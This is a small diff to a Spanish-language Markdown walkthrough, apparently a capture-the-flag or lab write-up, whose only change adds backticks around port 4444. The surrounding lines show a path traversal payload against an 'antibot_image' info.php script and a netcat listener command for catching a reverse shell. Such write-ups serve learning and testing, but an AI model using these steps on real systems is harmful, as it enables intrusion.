@@ -113,7 +113,7 @@ antibot_image/antibots/info.php?image=../../../../../../../../../../../../var/lo
 ```
 ![14](https://user-images.githubusercontent.com/75953873/175165089-399a559f-9aa8-46d8-a638-c03704825c1f.png)
 
-Después, ponemos a netcat en escucha por el puerto 4444 para obtener una reverse shell:
+Después, ponemos a netcat en escucha por el puerto `4444` para obtener una reverse shell:
 ```
 nc -lvnp 4444
 ```
